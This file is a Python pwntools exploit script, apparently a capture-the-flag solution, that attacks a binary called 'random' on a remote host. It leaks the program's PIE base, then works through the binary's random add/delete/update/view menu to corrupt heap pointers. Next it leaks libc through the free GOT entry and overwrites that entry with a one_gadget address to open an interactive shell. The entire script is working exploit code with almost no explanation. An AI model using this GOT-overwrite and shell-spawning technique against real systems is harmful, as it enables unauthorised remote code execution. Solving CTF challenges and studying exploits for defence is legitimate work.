__author__ = "polaris"
from pwn import *
context.log_level = "debug"
context.terminal = ['tmux', 'sp', '-h']
#p = process("./random")
p = remote("117.78.28.89",30077)
#gdb.attach(p)

p.recvuntil("name:\n")
p.send("A"*8)
p.recvuntil("AAAAAAAA")
pie_addr = u64(p.recvn(6)+"\x00\x00")-2960
print hex(pie_addr)

p.sendline("-1")



def update(index,data):
    p.sendline("Y")
    p.recvline()
    p.sendline(str(index))
    p.recvline()
    p.sendline(data)

def addline(size,data,tomorrow):
    p.sendline("Y")
    p.recvline()
    p.sendline(str(size))
    p.recvline()
    p.sendline(data)
    p.recvuntil("tomorrow?(Y/N)\n")
    p.sendline(tomorrow)

def add(size,data,tomorrow):
    p.sendline("Y")
    p.recvline()
    p.sendline(str(size))
    p.recvline()
    p.send(data)
    p.recvuntil("tomorrow?(Y/N)\n")
    p.sendline(tomorrow)

def delete(index):
    p.sendline("Y")
    p.recvline()
    p.sendline(str(index))

def view(index):
    p.sendline("Y")
    p.recvline()
    p.sendline(str(index))
    return p.recvuntil("success").strip("success")

def pass_view():
    p.sendline("Y")
    p.recvline()
    p.sendline(str(20))

def pass_delete():
    p.sendline("Y")
    p.recvline()
    p.sendline(str(20))

def pass_update():
    p.sendline("Y")
    p.recvline()
    p.sendline(str(20))

def pass_add():
    p.sendline("Y")
    p.recvline()
    p.sendline(str(-1))

count = 0

p.recvuntil("(0~10)\n")
p.sendline("8")
data = p.recvline()
if "add" in data:
    addline(0x21,"A","Y")
for i in range(7):
    data = p.recvline()
    if "add" in data:
        pass_add()
    elif "delete" in data:
        pass_delete()
    elif "update" in data:
        pass_update()
    elif "view" in data:
        pass_view()
p.recvuntil("(0~10)\n")
p.sendline("5")

for i in range(7):
    data = p.recvline()
    if "add" in data:
        pass_add()
    elif "delete" in data:
        pass_delete()
    elif "update" in data:
        pass_update()
    elif "view" in data:
        pass_view()

p.recvuntil("(0~10)\n")
p.sendline("1")
p.recvline()
pass_view()
p.recvuntil("(0~10)\n")
p.sendline("1")
p.recvline()
pass_view()
p.recvuntil("(0~10)\n")
p.sendline("1")
p.recvline()
pass_delete()
p.recvuntil("(0~10)\n")
p.sendline("1")
p.recvline()
addline(10,p64(0x203180+pie_addr),"N")



count = 0
while True:
    p.recvuntil("(0~10)\n")
    p.sendline("1")
    data = p.recvline()
    if "add" in data:
        addline(0x31,"/bin/sh\x00","N")
        count +=1 
        if count==2:
            break
    elif "delete" in data:
        pass_delete()
    elif "update" in data:
        pass_update()
    elif "view" in data:
        pass_view()

elf = ELF("./random")

while True:
    p.recvuntil("(0~10)\n")
    p.sendline("9")
    data = p.recvline()
    if "add" in data:
        addline(10,p64(elf.got["free"]+pie_addr),"N")
        break
    elif "delete" in data:
        pass_delete()
    elif "update" in data:
        pass_update()
    elif "view" in data:
        pass_view()

    for i in range(8):
        data = p.recvline()
        if "add" in data:
            pass_add()
        elif "delete" in data:
            pass_delete()
        elif "update" in data:
            pass_update()
        elif "view" in data:
            pass_view()

for i in range(8):
    data = p.recvline()
    if "add" in data:
        pass_add()
    elif "delete" in data:
        pass_delete()
    elif "update" in data:
        pass_update()
    elif "view" in data:
        pass_view()

libc_addr = 0
while True:
    p.recvuntil("(0~10)\n")
    p.sendline("1")
    data = p.recvline()
    if "add" in data:
        pass_add()
    elif "delete" in data:
        pass_delete()
    elif "update" in data:
        pass_update()
    elif "view" in data:
        addr = view(1).strip("\n")
        print repr(addr)
        libc_addr = u64(addr+"\x00\x00")-elf.libc.sym["free"]
        break

while True:
    p.recvuntil("(0~10)\n")
    p.sendline("1")
    data = p.recvline()
    if "add" in data:
        pass_add()
    elif "delete" in data:
        pass_delete()
    elif "update" in data:
        #update(1,p64(libc_addr+elf.libc.sym["system"]))
        update(1,p64(libc_addr+0xf1147   ))
        break
    elif "view" in data:
        pass_view()
p.interactive()
print "===================="
while True:
    p.recvuntil("(0~10)\n")
    p.sendline("1")
    data = p.recvline()
    if "add" in data:
        pass_add()
    elif "delete" in data:
        delete(2)
    elif "update" in data:
        pass_update()
    elif "view" in data:
        pass_view()

p.interactive()

"""
p.recvuntil("(0~10)\n")
p.sendline("8")

data = p.recvline()
if "add" in data:
    addline(10,"A","Y")
    
for i in range(7):
    data = p.recvline()
    if "add" in data:
        pass_add()
    elif "delete" in data:
        pass_delete()
    elif "update" in data:
        pass_update()
    elif "view" in data:
        pass_view()

p.recvuntil("(0~10)\n")
p.sendline("5")

#for i in range(9):
#    data = p.recvline()
#    if "add" in data:
#        addline(10,"A","N")
#    elif "delete" in data:
#        pass_delete()
#    elif "update" in data:
#        pass_update()
#    elif "view" in data:
#        pass_view()

p.interactive()
"""
